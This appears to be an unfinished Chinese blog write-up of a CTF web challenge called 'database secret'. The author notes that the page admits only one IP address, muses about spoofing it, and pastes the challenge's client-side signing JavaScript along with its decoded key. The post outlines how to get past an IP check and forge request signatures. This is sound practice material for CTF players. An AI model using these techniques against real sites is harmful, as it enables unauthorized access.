第一题 数据库的秘密 （100分）


就是这个题目，点进去首先看下提示。

好像没啥提示，就是说了个数据库的秘密…到底有啥秘密还得点进去那个网址具体看看。

说实话，点进去这个网址的一瞬间我是有点懵逼的。这是啥？？？乱码吗？这跟….数据有个啥关系啊…？也不显示什么数据的参数传递啊。

说实话，没想到一瞬间第一题就跪了…真心是有点丢人的啊…
没办法，去看大佬们也就是赛棍写的文章去了。
大佬上面说的这第一题打开题目是限制ip访问，反正是乱码…我说啥也没看出来。限制ip，或者不限制ip访问的。等等，且让我此处换个浏览器试试。
果不其然..换个浏览器就能看出来是有提示的了。我敲…我真的是此刻非常的无语。上图…chrome浏览器就能完美的显示，我估计是我那个浏览器编码问题。

上面显示的是只准123.232.23.245，那么这句话透露出的信息，就是我得把我自己伪造成这个ip，或者在他接受我传输过去的信息的时候，得让他以为我是123.232.23.245，感觉自己说了句废话。

讲真的，说实话，我真的对于伪造ip几乎就没有了解过，平常挂个代理以为就是伪造ip了，事实上根本就不是的。

说实话，没接触过，所以特地现在去接触看看，百度百度一下，看下到底是什么东西。

// key 位于主页 JS 中，此处不再单独截图。内容是 adrefkfweodfsdpiru
var key="141144162145146153146167145157144146163144160151162165" 
function signGenerate(obj, key) {
    var str0 = '';
    for (i in obj) {
        if (i != 'sign') {
            str1 = '';
            str1 = i + '=' + obj[i];
            str0 += str1
        }
    }
    return hex_math_enc(str0 + key)
};
var obj = {
    id: '',
    title: '',
    author: '',
    date: '',
    time: parseInt(new Date().getTime() / 1000)
};
function submitt() {
    obj['id'] = document.getElementById('id').value;
    obj['title'] = document.getElementById('title').value;
    obj['author'] = document.getElementById('author').value;
    obj['date'] = document.getElementById('date').value;
    var sign = signGenerate(obj, key);
    document.getElementById('queryForm').action = "index.php?sig=" + sign + "&time=" + obj.time;
    document.getElementById('queryForm').submit()
}
